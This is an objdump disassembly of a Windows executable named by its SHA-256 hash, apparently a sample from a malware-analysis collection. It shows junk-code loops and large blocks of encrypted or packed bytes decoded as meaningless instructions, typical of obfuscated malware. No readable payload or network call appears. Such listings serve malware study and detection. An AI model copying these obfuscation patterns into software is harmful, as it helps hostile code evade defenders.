
516e43b21feca8ad2922a2f389331d601a805dc1cf3c41b5a85ca049b294fade.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	sbb    DWORD PTR ds:0x43460b,ecx
  40100c:	mov    eax,ds:0x414afe
  401011:	mov    eax,DWORD PTR [eax+0x198]
  401017:	mov    DWORD PTR [ebp-0x8],eax
  40101a:	add    eax,DWORD PTR ds:0x4344e3
  401020:	mov    eax,DWORD PTR [ebp+0x8]
  401023:	dec    DWORD PTR ds:0x434553
  401029:	mov    ecx,DWORD PTR [ebp-0x8]
  40102c:	sbb    DWORD PTR ds:0x4344f3,0x434547
  401036:	push   ebx
  401037:	push   esi
  401038:	sub    DWORD PTR ds:0x43460b,ebx
  40103e:	mov    esi,0x7510851
  401043:	mov    DWORD PTR ds:0x43453b,0x10
  40104d:	cmp    DWORD PTR ds:0x43453b,0x0
  401054:	je     0x4010ad
  40105a:	cmp    DWORD PTR ds:0x43453b,0x2
  401061:	jne    0x40107b
  401067:	push   DWORD PTR [ebp-0x1c]
  40106a:	push   DWORD PTR [ebp-0x18]
  40106d:	push   DWORD PTR [ebp-0x24]
  401070:	push   0x7fb5
  401075:	call   DWORD PTR ds:0x4130b4
  40107b:	cmp    DWORD PTR ds:0x43453b,0x3
  401082:	jne    0x401095
  401088:	mov    ebx,DWORD PTR ds:0x43453b
  40108e:	dec    ebx
  40108f:	mov    DWORD PTR ds:0x43453b,ebx
  401095:	mov    ebx,DWORD PTR ds:0x43453b
  40109b:	dec    ebx
  40109c:	mov    DWORD PTR ds:0x43453b,ebx
  4010a2:	jmp    0x40104d
  4010a7:	adc    DWORD PTR ds:0x43460f,ecx
  4010ad:	xor    eax,esi
  4010af:	push   edi
  4010b0:	mov    edi,DWORD PTR ds:0x43455f
  4010b6:	mov    ebx,DWORD PTR ds:0x434633
  4010bc:	sub    ebx,edi
  4010be:	imul   edi,DWORD PTR [edi+ebx*1]
  4010c2:	mov    edi,0x327299
  4010c7:	adc    DWORD PTR ds:0x434507,0x43458b
  4010d1:	add    eax,edi
  4010d3:	and    DWORD PTR ds:0x43458f,0x0
  4010dd:	jmp    0x4010ef
  4010e2:	mov    ebx,DWORD PTR ds:0x43458f
  4010e8:	inc    ebx
  4010e9:	mov    DWORD PTR ds:0x43458f,ebx
  4010ef:	cmp    DWORD PTR ds:0x43458f,0x1d
  4010f6:	jae    0x401312
  4010fc:	cmp    DWORD PTR ds:0x43458f,0xe
  401103:	jne    0x401119
  401109:	push   0x4344eb
  40110e:	push   0x43485b
  401113:	call   DWORD PTR ds:0x41332c
  401119:	cmp    DWORD PTR ds:0x43458f,0xd
  401120:	jne    0x401133
  401126:	mov    ebx,DWORD PTR ds:0x43458f
  40112c:	inc    ebx
  40112d:	mov    DWORD PTR ds:0x43458f,ebx
  401133:	jmp    0x4010e2
  401138:	or     DWORD PTR ds:0x4344eb,ebx
  40113e:	jmp    0x401312
  401143:	test   ah,ch
  401145:	push   edx
  401146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401147:	jb     0x4010fd
  401149:	jl     0x401137
  40114b:	pop    eax
  40114c:	or     eax,0x6fc01829
  401151:	es out 0x7e,eax
  401154:	jle    0x4011d4
  401156:	jle    0x40110d
  401158:	jg     0x4011d8
  40115a:	jle    0x40112a
  40115c:	xlat   BYTE PTR ds:[ebx]
  40115d:	cmp    ecx,edx
  40115f:	(bad)
  401162:	(bad)  
  401164:	pop    es
  401165:	add    BYTE PTR [ebx],al
  401167:	shld   DWORD PTR [edi+ecx*1],ecx,0x33
  40116c:	bswap  esp
  40116e:	and    al,0xc7
  401170:	sbb    al,0x1f
  401172:	inc    ebp
  401173:	fs or  al,0xb7
  401176:	(bad)  [esi]
  401178:	out    dx,eax
  401179:	mov    ecx,0x8e03d6db
  40117e:	es mov esi,0x114da2f0
  401184:	test   eax,0x661f46de
  401189:	call   0x985d1cfd
  40118e:	add    al,0xd6
  401190:	dec    esp
  401191:	stos   BYTE PTR es:[edi],al
  401192:	push   ebx
  401193:	sub    ebp,ebx
  401195:	sar    BYTE PTR [eax],0xa9
  401198:	mov    bh,BYTE PTR [ebx-0x3f]
  40119b:	stos   DWORD PTR es:[edi],eax
  40119c:	push   es
  40119d:	rcl    bl,0x8d
  4011a0:	test   esi,edx
  4011a2:	pushf  
  4011a3:	(bad)
  4011a6:	mov    esi,ebp
  4011a8:	dec    edi
  4011a9:	out    0xa6,al
  4011ab:	dec    ebp
  4011ac:	call   DWORD PTR [edi-0x254af85c]
  4011b2:	mov    ecx,0x5136e949
  4011b7:	and    esi,DWORD PTR [edx-0x47619116]
  4011bd:	jnp    0x4011dc
  4011bf:	ret    
  4011c0:	xchg   edx,eax
  4011c1:	sub    eax,0xc25eebd0
  4011c6:	loopne 0x40120c
  4011c8:	cld    
  4011c9:	jmp    0xd761:0x70cf3d92
  4011d0:	sub    al,0xc9
  4011d2:	add    ah,ch
  4011d4:	sbb    eax,0x331a65d
  4011d9:	outs   dx,DWORD PTR ds:[esi]
  4011da:	ins    DWORD PTR es:[edi],dx
  4011db:	add    al,0x14
  4011dd:	cmp    eax,0x34508ed9
  4011e2:	jno    0x401263
  4011e4:	(bad)
  4011e9:	or     ebx,DWORD PTR [ebx+0x51]
  4011ec:	(bad)  
  4011ee:	adc    eax,0x25e558d3
  4011f3:	jge    0x401193
  4011f5:	inc    esi
  4011f6:	dec    ebx
  4011f7:	aaa    
  4011f8:	adc    DWORD PTR [ebx],ebp
  4011fa:	ja     0x401231
  4011fc:	sbb    dl,bl
  4011fe:	ds dec edi
  401200:	hlt    
  401201:	leave  
  401202:	mov    al,ds:0x3ee3d0b1
  401207:	jns    0x401190
  401209:	xchg   esp,eax
  40120a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40120b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40120c:	mov    bh,0x79
  40120e:	lds    eax,FWORD PTR [esi+0x73]
  401211:	mov    bl,0x84
  401213:	cmp    esp,DWORD PTR [esi+0x71540c80]
  401219:	lods   eax,DWORD PTR ds:[esi]
  40121a:	gs xor eax,0x7fee5d3b
  401220:	jne    0x401275
  401222:	or     eax,0xe625652d
  401227:	pop    ebx
  401228:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401229:	cmp    dh,BYTE PTR ds:0xa17e2b15
  40122f:	adc    eax,DWORD PTR [ebp+ebx*4-0x5]
  401233:	add    DWORD PTR ds:0xc96d9c9e,ebx
  401239:	shl    BYTE PTR [esi-0x6ac8d167],1
  40123f:	ins    BYTE PTR es:[edi],dx
  401240:	jae    0x40122b
  401242:	cmp    edi,DWORD PTR [ebp+0x6072b886]
  401248:	jp     0x4011f7
  40124a:	jg     0x4012a3
  40124c:	xchg   esi,eax
  40124d:	sub    BYTE PTR [edi-0x1629b09c],bl
  401253:	(bad)  
  401254:	mov    dh,ah
  401256:	mov    es,WORD PTR [eax-0x22]
  401259:	daa    
  40125a:	inc    esi
  40125b:	or     BYTE PTR [esi-0x2e],bl
  40125e:	mov    edx,0xda00cae7
  401263:	jne    0x4012d1
  401265:	sbb    BYTE PTR [edi-0x45],ah
  401268:	inc    edx
  401269:	leave  
  40126a:	mov    ds:0x97c406af,eax
  40126f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401270:	std    
  401271:	dec    esi
  401272:	mov    esp,fs
  401274:	(bad)  
  401275:	jg     0x401297
  401277:	scas   eax,DWORD PTR es:[edi]
  401278:	iret   
  401279:	mov    bl,0x95
  40127b:	mov    ch,0x67
  40127d:	push   esp
  40127e:	in     al,0xeb
  401280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401281:	dec    ecx
  401282:	and    ch,BYTE PTR [edi-0x7d015e9f]
  401288:	rcl    DWORD PTR [eax],cl
  40128a:	test   ch,bh
  40128c:	add    eax,0x9a4895f5
  401291:	push   0x38
  401293:	std    
  401294:	push   cs
  401295:	or     DWORD PTR [esi+esi*1+0xe23fea5],ecx
  40129c:	or     eax,0x16aed68
  4012a1:	enter  0xdd78,0xe
  4012a5:	xchg   edi,eax
  4012a6:	lea    ebx,[edi-0x51]
  4012a9:	repnz xor eax,0xf75a67ea
  4012af:	popa   
  4012b0:	cmp    BYTE PTR [ebp+0x1eef3a66],ah
  4012b6:	adc    edx,DWORD PTR [edi]
  4012b8:	sub    DWORD PTR [edi],edx
  4012ba:	rcl    BYTE PTR [ebx+0x4aa5219],0xab
  4012c1:	jmp    0x4012f4
  4012c3:	add    DWORD PTR [esi-0x1d],ecx
  4012c6:	ja     0x40127f
  4012c8:	mov    ch,0x8b
  4012ca:	pop    ss
  4012cb:	push   esi
  4012cc:	and    eax,0xcb5ee128
  4012d1:	dec    edx
  4012d2:	add    BYTE PTR ds:0x6c45614a,0xf0
  4012d9:	mov    edi,0xca9678c2
  4012de:	add    ebx,DWORD PTR [edx-0x60]
  4012e1:	xor    eax,0x7634a06c
  4012e6:	into   
  4012e7:	in     al,dx
  4012e8:	hlt    
  4012e9:	add    eax,0xffffffda
  4012ec:	mul    DWORD PTR [eax-0x26]
  4012ef:	mov    ds:0xe1f58460,eax
  4012f4:	pop    esp
  4012f5:	scas   al,BYTE PTR es:[edi]
  4012f6:	mov    ebp,0xef52931b
  4012fb:	in     al,0xc9
  4012fd:	(bad)  
  4012fe:	mov    ch,0x8d
  401300:	dec    esp
  401301:	(bad)  
  401303:	out    0xce,eax
  401305:	xchg   ebp,eax
  401306:	ret    0xd880
  401309:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40130a:	pop    sp
  40130c:	das    
  40130d:	int    0xac
  40130f:	sbb    ah,BYTE PTR [ebx]
  401311:	aad    0x89
  401313:	add    DWORD PTR [ecx+0x1222d1],eax
  401319:	add    BYTE PTR [ebp+0x3581fc45],cl
  40131f:	jg     0x401366
  401321:	inc    ebx
  401322:	add    ah,bl
  401324:	push   ebx
  401325:	add    BYTE PTR [eax],al
  401327:	mov    DWORD PTR [ebp-0x10],eax
  40132a:	adc    DWORD PTR ds:0x43453f,edi
  401330:	mov    eax,DWORD PTR [ebp+0x8]
  401333:	or     DWORD PTR ds:0x4344ef,0x4344e3
  40133d:	mov    ecx,DWORD PTR [ebp-0x10]
  401340:	xor    DWORD PTR ds:0x4344f3,ebx
  401346:	xor    eax,esi
  401348:	neg    ebx
  40134a:	add    eax,edi
  40134c:	mov    DWORD PTR [ecx],eax
  40134e:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  401355:	lea    eax,[ebp-0x14]
  401358:	sbb    ecx,ecx
  40135a:	mov    DWORD PTR [ebp-0x20],eax
  40135d:	mov    eax,DWORD PTR [ebp-0x14]
  401360:	mov    ecx,DWORD PTR [ebp-0x20]
  401363:	and    DWORD PTR ds:0x4345c3,0x0
  40136d:	xor    ebx,ebx
  40136f:	add    ebx,DWORD PTR ds:0x4345c3
  401375:	inc    ebx
  401376:	mov    DWORD PTR ds:0x4345c3,ebx
  40137c:	cmp    DWORD PTR ds:0x4345c3,0x9
  401383:	jne    0x401394
  401389:	push   0x3702
  40138e:	call   DWORD PTR ds:0x4130b8
  401394:	cmp    DWORD PTR ds:0x4345c3,0x8
  40139b:	jne    0x4013ae
  4013a1:	mov    ebx,DWORD PTR ds:0x4345c3
  4013a7:	inc    ebx
  4013a8:	mov    DWORD PTR ds:0x4345c3,ebx
  4013ae:	cmp    DWORD PTR ds:0x4345c3,0x1c
  4013b5:	jb     0x40136d
  4013bb:	add    DWORD PTR ds:0x43453f,ecx
  4013c1:	xor    eax,esi
  4013c3:	add    eax,edi
  4013c5:	mov    DWORD PTR [ecx],eax
  4013c7:	dec    DWORD PTR ds:0x43458b
  4013cd:	mov    eax,ds:0x414bd2
  4013d2:	mov    ebx,0x8e12febf
  4013d7:	mov    DWORD PTR [ebp-0xc],ebx
  4013da:	sbb    DWORD PTR ds:0x4344ef,0x43453f
  4013e4:	mov    eax,DWORD PTR [eax]
  4013e6:	adc    DWORD PTR ds:0x4344eb,0x4345f7
  4013f0:	mov    cx,WORD PTR [ebp-0x4]
  4013f4:	xor    DWORD PTR ds:0x434503,0x1391
  4013fe:	movzx  ecx,cx
  401401:	add    ecx,DWORD PTR [eax]
  401403:	mov    DWORD PTR [ebp-0x18],ecx
  401406:	jmp    0x4015da
  40140b:	fisub  DWORD PTR [esi]
  40140d:	add    BYTE PTR [ecx],0x42
  401410:	lods   eax,DWORD PTR ds:[esi]
  401411:	gs in  eax,dx
  401413:	aam    0x1e
  401415:	dec    edx
  401416:	xchg   edx,edx
  401418:	mov    edx,ss
  40141a:	loope  0x4013d1
  40141c:	jg     0x40149c
  40141e:	jle    0x4013d5
  401420:	jg     0x4014a0
  401422:	jle    0x401466
  401424:	add    eax,0x98749bf4
  401429:	cmc    
  40142a:	cmp    eax,0xe82b2b48
  40142f:	jmp    0x40148d
  401431:	cmp    al,0xe0
  401433:	cmp    al,0x28
  401435:	sahf   
  401436:	setbe  bl
  401439:	outs   dx,DWORD PTR cs:[esi]
  40143b:	out    0x6e,eax
  40143d:	cli    
  40143e:	pop    ss
  40143f:	lea    edx,[ecx+edi*2-0x11e89920]
  401446:	and    BYTE PTR [ebx+0x4baea026],bh
  40144c:	out    dx,eax
  40144d:	test   al,0x2c
  40144f:	mov    BYTE PTR [ebp+eiz*2-0x505700c1],bh
  401456:	or     BYTE PTR [edx-0x22],0xb6
  40145a:	xchg   esi,eax
  40145b:	scas   eax,DWORD PTR es:[di]
  40145d:	mov    cl,0xff
  40145f:	sar    BYTE PTR [edi+edx*8+0x7c],cl
  401463:	test   DWORD PTR [ebx+eax*8],ebp
  401466:	push   cs
  401467:	jo     0x401487
  401469:	pop    esi
  40146a:	adc    dl,dh
  40146c:	push   cs
  40146d:	pop    es
  40146e:	mov    ecx,edi
  401470:	cmp    ebx,DWORD PTR [ebx]
  401472:	mov    bl,0x65
  401474:	daa    
  401475:	add    ch,ah
  401477:	or     edx,0xb3d60832
  40147d:	push   0xffffffb0
  40147f:	or     ebx,esp
  401481:	lods   eax,DWORD PTR ds:[esi]
  401482:	sub    eax,DWORD PTR [ebp-0x34]
  401485:	or     DWORD PTR [esi+ecx*8],edx
  401488:	sahf   
  401489:	xor    BYTE PTR [ebx-0x3],ah
  40148c:	push   ds
  40148d:	ins    DWORD PTR es:[edi],dx
  40148e:	loope  0x4014d5
  401490:	push   ecx
  401491:	cdq    
  401492:	sub    esi,esi
  401494:	adc    cl,BYTE PTR [esi+eiz*1+0x26cac869]
  40149b:	mov    ds:0x6a2af46a,eax
  4014a0:	(bad)  
  4014a1:	fist   WORD PTR [esi]
  4014a3:	sub    eax,DWORD PTR [ecx+0x75]
  4014a6:	fstp   TBYTE PTR [ebp+ecx*8+0xa9c35fb]
  4014ad:	push   0x8e12bb62
  4014b2:	cli    
  4014b3:	adc    edx,0xa6e25066
  4014b9:	dec    edi
  4014ba:	outs   dx,DWORD PTR ds:[esi]
  4014bb:	cmc    
  4014bc:	sahf   
  4014bd:	fisttp DWORD PTR [ebx-0x41]
  4014c0:	rcr    edx,1
  4014c2:	xor    al,0xfa
  4014c4:	inc    edx
  4014c5:	push   ss
  4014c6:	inc    ecx
  4014c7:	imul   ecx,DWORD PTR [eax+0x4d1de000],0x1
  4014ce:	push   ds
  4014cf:	loope  0x401473
  4014d1:	fist   WORD PTR [edx]
  4014d3:	xchg   edi,eax
  4014d4:	jb     0x401472
  4014d6:	aaa    
  4014d7:	div    DWORD PTR [ebx-0x227c6940]
  4014dd:	jg     0x4014c9
  4014df:	outs   dx,BYTE PTR ds:[esi]
  4014e0:	add    DWORD PTR [edx-0x4135e1e9],ecx
  4014e6:	nop
  4014e7:	ficom  DWORD PTR [edx-0x177b2420]
  4014ed:	dec    eax
  4014ee:	sbb    eax,DWORD PTR [ebx+0x2d4c391e]
  4014f4:	dec    edi
  4014f5:	push   esi
  4014f6:	mov    WORD PTR [edi+eax*4-0x66d3cb4a],?
  4014fd:	test   al,0xeb
  4014ff:	ficom  DWORD PTR [ebx+0x47fa50da]
  401505:	add    al,BYTE PTR [edx]
  401507:	pop    es
  401508:	xchg   edi,eax
  401509:	es jo  0x401506
  40150c:	dec    eax
  40150d:	mov    dl,0x62
  40150f:	not    DWORD PTR [eax]
  401511:	retf   0xabd8
  401514:	sub    bh,bh
  401516:	or     DWORD PTR [edi-0x4c],esi
  401519:	lahf   
  40151a:	(bad)  
  40151b:	retf   0x43d
  40151e:	test   BYTE PTR [edi+0x6a],cl
  401521:	clc    
  401522:	mov    ebp,0x90aedc5a
  401527:	leave  
  401528:	and    BYTE PTR [ebp-0xc15be64],dl
  40152e:	adc    ch,BYTE PTR [ecx]
  401530:	xchg   esi,eax
  401531:	and    al,0x96
  401533:	retf   0xfbc8
  401536:	bound  ebx,QWORD PTR [ecx-0x30]
  401539:	lods   eax,DWORD PTR ds:[esi]
  40153a:	jp     0x401516
  40153c:	clc    
  40153d:	mov    esp,0xb901cf47
  401542:	dec    edi
  401543:	mov    DWORD PTR [ebp+0x6e],edi
  401546:	dec    esp
  401547:	test   eax,0x7b23e633
  40154c:	xchg   DWORD PTR [edx],esi
  40154e:	dec    edi
  40154f:	sbb    ah,BYTE PTR [ecx-0x73]
  401552:	sahf   
  401553:	mov    eax,DWORD PTR [edi+0x69]
  401556:	pop    edx
  401557:	dec    ebx
  401558:	cld    
  401559:	retf   0x23c4
  40155c:	jae    0x401543
  40155e:	and    bl,BYTE PTR [ebx]
  401560:	push   0xaf7f4f86
  401565:	(bad)  
  401566:	int3   
  401567:	adc    ecx,DWORD PTR [ecx+ebx*4-0x2b]
  40156b:	xlat   BYTE PTR ds:[ebx]
  40156c:	fs cld 
  40156e:	cmp    BYTE PTR [ecx+0x3624cfb3],0x96
  401575:	pop    eax
  401576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401577:	add    eax,0x60c09ae
  40157c:	ds jnp 0x401523
  40157f:	jecxz  0x4015b6
  401581:	mov    cl,0x0
  401583:	push   es
  401584:	xchg   esi,eax
  401585:	jl     0x4015cb
  401587:	or     eax,DWORD PTR [edx-0x5b5e156d]
  40158d:	cmp    dh,BYTE PTR [edx]
  40158f:	mov    eax,0x3f305dc9
  401594:	(bad)
  401598:	jmp    DWORD PTR [eax+0x690be591]
  40159e:	or     bh,0xdd
  4015a1:	inc    edi
  4015a2:	xchg   edi,eax
  4015a3:	mov    ebp,0x8e5bfd58
  4015a8:	pushf  
  4015a9:	adc    dh,BYTE PTR [edi-0x67cb93ed]
  4015af:	aad    0xdf
  4015b1:	arpl   WORD PTR [ebx-0x3e],bx
  4015b4:	sahf   
  4015b5:	paddsw mm5,QWORD PTR [edi+0x2e8f740c]
  4015bc:	cmp    al,0xf5
  4015be:	and    ah,al
  4015c0:	mov    bl,0xa0
  4015c2:	aaa    
  4015c3:	xor    esi,ebp
  4015c5:	les    ebp,FWORD PTR [ebp+0x68]
  4015c8:	or     al,0x67
  4015ca:	sbb    BYTE PTR [eax+0x39bff5a6],bh
  4015d0:	sbb    DWORD PTR [edx+ebx*8+0x6aa9b6bf],esp
  4015d7:	adc    bl,bl
  4015d9:	imul   ecx,DWORD PTR [ebx+0xd8b0845],0xf
  4015e0:	inc    esi
  4015e1:	inc    ebx
  4015e2:	add    BYTE PTR [ecx],ah
  4015e4:	or     eax,0x4345bf
  4015e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4015ec:	xor    eax,esi
  4015ee:	add    DWORD PTR ds:0x4344e3,0x598
  4015f8:	add    eax,edi
  4015fa:	mov    DWORD PTR ds:0x434543,0x7c6b
  401604:	cmp    DWORD PTR [ecx],eax
  401606:	mov    DWORD PTR ds:0x434593,0x6dd9
  401610:	jne    0x40227a
  401616:	and    DWORD PTR ds:0x434583,0x0
  401620:	mov    ecx,DWORD PTR ds:0x434583
  401626:	inc    ecx
  401627:	mov    DWORD PTR ds:0x434583,ecx
  40162d:	cmp    DWORD PTR ds:0x434583,0x4
  401634:	jne    0x401645
  40163a:	push   0x2f81
  40163f:	call   DWORD PTR ds:0x413270
  401645:	cmp    DWORD PTR ds:0x434583,0x3
  40164c:	jne    0x40165f
  401652:	mov    ecx,DWORD PTR ds:0x434583
  401658:	inc    ecx
  401659:	mov    DWORD PTR ds:0x434583,ecx
  40165f:	cmp    DWORD PTR ds:0x434583,0x14
  401666:	jb     0x401620
  40166c:	xor    ecx,ecx
  40166e:	or     ecx,DWORD PTR ds:0x434523
  401674:	mov    eax,ds:0x43456b
  401679:	sub    eax,ecx
  40167b:	and    ecx,DWORD PTR [ecx+eax*1]
  40167e:	mov    eax,DWORD PTR [ebp+0x8]
  401681:	mov    ecx,DWORD PTR [ebp-0x18]
  401684:	add    DWORD PTR ds:0x4345cb,0x4345f7
  40168e:	xor    eax,esi
  401690:	or     DWORD PTR ds:0x4344eb,0x526e
  40169a:	add    eax,edi
  40169c:	mov    DWORD PTR ds:0x4344ef,0x6068
  4016a6:	cmp    DWORD PTR [ecx],eax
  4016a8:	jmp    0x40187c
  4016ad:	cmp    dh,BYTE PTR [esi]
  4016af:	sub    eax,0x6255fdb9
  4016b4:	mov    ebp,0xf85a51d5
  4016b9:	inc    edi
  4016ba:	mov    DWORD PTR [eax],edx
  4016bc:	fsubr  st,st(4)
  4016be:	jns    0x40173e
  4016c0:	jle    0x401677
  4016c2:	jg     0x401742
  4016c4:	jle    0x401731
  4016c6:	leave  
  4016c7:	fisubr DWORD PTR [ebp+0x3a2b8f2a]
  4016cd:	pop    ecx
  4016ce:	retfw  0x45c5
  4016d2:	test   BYTE PTR [edx+eax*1-0x7f],bl
  4016d6:	lods   eax,DWORD PTR ds:[esi]
  4016d7:	out    0x5c,al
  4016d9:	cli    
  4016da:	fldcw  WORD PTR [esi+0xa593060]
  4016e0:	mov    eax,0xcde7063d
  4016e5:	popa   
  4016e6:	int    0x88
  4016e8:	in     al,dx
  4016e9:	fucom  st(6)
  4016eb:	jne    0x401756
  4016ed:	push   es
  4016ee:	test   BYTE PTR [esi-0x5c],bl
  4016f1:	xchg   DWORD PTR [esp+eax*2+0x13340d90],esp
  4016f8:	fnstenv [eax]
  4016fa:	jae    0x401700
  4016fc:	mov    ds:0x4311061c,eax
  401701:	or     edi,ebx
  401703:	sub    DWORD PTR [edi+0x20],edi
  401706:	ror    dh,cl
  401708:	pop    ebx
  401709:	icebp  
  40170a:	mov    ecx,0xa8776526
  40170f:	cmp    al,0xa4
  401711:	pop    ss
  401712:	xchg   edx,eax
  401713:	add    BYTE PTR [eax-0x394f4963],dh
  401719:	mov    edx,0x46275587
  40171e:	inc    esi
  40171f:	sahf   
  401720:	in     eax,dx
  401721:	xchg   ecx,eax
  401722:	push   eax
  401723:	out    dx,al
  401724:	add    bh,al
  401726:	xchg   esp,eax
  401727:	cmp    al,0xe7
  401729:	pop    es
  40172a:	je     0x4016b7
  40172c:	xlat   BYTE PTR ds:[ebx]
  40172d:	cvtpi2ps xmm6,mm5
  401730:	or     BYTE PTR [ebx+0x74],ch
  401733:	test   al,0xd6
  401735:	jp     0x4016ed
  401737:	inc    ecx
  401738:	bound  edx,QWORD PTR [esi]
  40173a:	ds and ebx,0xc1e2f3c7
  401741:	inc    ebp
  401742:	xchg   esi,eax
  401743:	sub    eax,0xdb4a779d
  401748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401749:	cs jmp 0x401731
  40174c:	cwde   
  40174d:	mov    esi,0xb70f0ca7
  401752:	in     al,0xd
  401754:	adc    edi,DWORD PTR [ebx]
  401756:	fwait
  401757:	ret    
  401758:	gs mov al,gs:0xd3ac5a81
  40175f:	scas   eax,DWORD PTR es:[edi]
  401760:	mov    ch,0x71
  401762:	push   edx
  401763:	dec    edx
  401764:	int    0xd2
  401766:	int    0x4c
  401768:	push   ebx
  401769:	inc    esi
  40176a:	jmp    0x9dc060f0
  40176f:	push   esp
  401770:	jmp    0x4017e3
  401772:	and    eax,0xa88000e
  401777:	mov    cl,0xfd
  401779:	fistp  WORD PTR [ecx+ebp*8]
  40177c:	mov    eax,ds:0x616f6714
  401781:	fnsave [ebx]
  401783:	push   ebx
  401784:	jl     0x4017aa
  401786:	outs   dx,DWORD PTR ds:[esi]
  401787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401788:	adc    DWORD PTR [ecx],esp
  40178a:	pop    edx
  40178b:	xchg   esp,eax
  40178c:	rcr    BYTE PTR [esi*4-0x3ead41fc],1
  401793:	jp     0x4017f1
  401795:	adc    eax,0xabdb365c
  40179a:	and    DWORD PTR [ebx],ebp
  40179c:	mov    eax,ds:0xe0daeb29
  4017a1:	lds    ebp,FWORD PTR [eax-0x3c]
  4017a4:	loope  0x401764
  4017a6:	dec    ecx
  4017a7:	fld    QWORD PTR [eax]
  4017a9:	add    BYTE PTR [ebp-0x6e82bb23],0xc5
  4017b0:	jle    0x401823
  4017b2:	mov    ebp,0xab501587
  4017b7:	loopne 0x40178d
  4017b9:	xor    BYTE PTR [ebx+0x77],al
  4017bc:	retf   0x2f12
  4017bf:	pop    esp
  4017c0:	mov    al,ds:0x8621bd23
  4017c5:	out    0xbc,eax
  4017c7:	adc    bh,BYTE PTR [esi]
  4017c9:	bound  esi,QWORD PTR [ebx-0x5f]
  4017cc:	jge    0x401829
  4017ce:	dec    ebp
  4017cf:	cwde   
  4017d0:	ds mov edi,0x3aa19b73
  4017d6:	jns    0x40175c
  4017d8:	inc    esp
  4017d9:	jge    0x4017fe
  4017db:	mov    esp,esp
  4017dd:	inc    ecx
  4017de:	and    eax,0x2b4c2062
  4017e3:	fwait
  4017e4:	neg    bl
  4017e6:	sub    ah,bh
  4017e8:	inc    ecx
  4017e9:	call   0x8fb8523d
  4017ee:	in     al,dx
  4017ef:	fst    QWORD PTR [edx]
  4017f1:	sub    al,0xd6
  4017f3:	sub    BYTE PTR [eax+ebx*2],dl
  4017f6:	jle    0x401841
  4017f8:	mov    esi,?
  4017fa:	lds    esi,FWORD PTR [esi+0x212a3f20]
  401800:	inc    edx
  401801:	pop    esi
  401802:	in     al,dx
  401803:	push   DWORD PTR [eax+0x1ad8e655]
  401809:	ret    0x168b
  40180c:	dec    ebx
  40180d:	adc    al,0xca
  40180f:	adc    DWORD PTR [eax-0x34d71001],0xe3ac4ab6
  401819:	mov    edx,0xe99d52de
  40181e:	ins    BYTE PTR es:[edi],dx
  40181f:	or     BYTE PTR [edx+0x5ac62382],0xee
  401826:	lods   al,BYTE PTR ds:[esi]
  401827:	xchg   DWORD PTR [ecx],eax
  401829:	leave  
  40182a:	fidiv  DWORD PTR [edi+0x33]
  40182d:	repz dec ebp
  40182f:	mov    DWORD PTR [esi],ebp
  401831:	popf   
  401832:	mov    ecx,0x1320d39
  401837:	mov    esp,0xf0325493
  40183c:	adc    bl,0x52
  40183f:	lock sub edi,0x6f30ca3f
  401846:	fstp   QWORD PTR ds:0x1dcfe092
  40184c:	into   
  40184d:	in     al,dx
  40184e:	jno    0x401857
  401850:	inc    edi
  401851:	je     0x4018c0
  401853:	dec    esp
  401854:	retf   
  401855:	add    edi,DWORD PTR [ebx]
  401857:	dec    ecx
  401858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401859:	cli    
  40185a:	jp     0x401875
  40185c:	add    al,0xaf
  40185e:	repnz cld 
  401860:	push   edi
  401861:	not    DWORD PTR fs:[di]
  401865:	adc    edi,DWORD PTR [edx-0xf2ad073]
  40186b:	out    0x91,al
  40186d:	shr    BYTE PTR [eax-0x69f63033],1
  401873:	out    dx,al
  401874:	out    0x94,eax
  401876:	push   ebp
  401877:	idiv   ch
  401879:	dec    ebp
  40187a:	(bad)  ds:[edi]
  40187d:	test   DWORD PTR [edi],esp
  40187f:	add    al,0x0
  401881:	add    BYTE PTR [ebx+0x4346030d],cl
  401887:	add    BYTE PTR [ecx],cl
  401889:	or     eax,0x4344e3
  40188e:	jmp    0x401a62
  401893:	or     esi,DWORD PTR [edi+eiz*2-0x2a]
  401897:	popa   
  401898:	(bad)  [ebx+0x728b6c7d]
  40189e:	sbb    BYTE PTR [ecx],ah
  4018a0:	or     al,0xc4
  4018a2:	fstp   DWORD PTR [ebx]
  4018a4:	jnp    0x401924
  4018a6:	jle    0x40185d
  4018a8:	jg     0x401928
  4018aa:	jle    0x401910
  4018ac:	es dec esp
  4018ae:	int    0xf8
  4018b0:	bound  ebx,QWORD PTR [edi]
  4018b2:	sub    DWORD PTR [eiz*8-0x2ca7c902],edx
  4018b9:	mov    edi,0x1cefe2bb
  4018be:	test   DWORD PTR [ecx+0x2f],ebx
  4018c1:	mov    WORD PTR [esi-0x2d],ds
  4018c4:	fcmovnb st,st(4)
  4018c6:	pop    esi
  4018c7:	stos   DWORD PTR es:[edi],eax
  4018c8:	push   esi
  4018c9:	(bad)
  4018cf:	xchg   BYTE PTR [ebp+0x5a],al
  4018d2:	pushf  
  4018d3:	jo     0x4018c7
  4018d5:	loope  0x401928
  4018d7:	fst    QWORD PTR [edi+ebp*8-0x3d]
  4018db:	arpl   WORD PTR [ebp+0x413524df],cx
  4018e1:	push   es
  4018e2:	mov    DWORD PTR ds:0xfa6903f4,edx
  4018e8:	dec    ebx
  4018e9:	sub    ebx,DWORD PTR [ebp+ebp*1-0x1c64a634]
  4018f0:	sub    eax,0x4a43eb86
  4018f5:	fst    QWORD PTR [edx+0x4f5ee307]
  4018fb:	mov    eax,ds:0x239cdc61
  401900:	sbb    BYTE PTR [ebx],dl
  401902:	mov    eax,eax
  401904:	jmp    0x401886
  401906:	pop    eax
  401907:	sti    
  401908:	xchg   esi,eax
  401909:	cmp    esi,esp
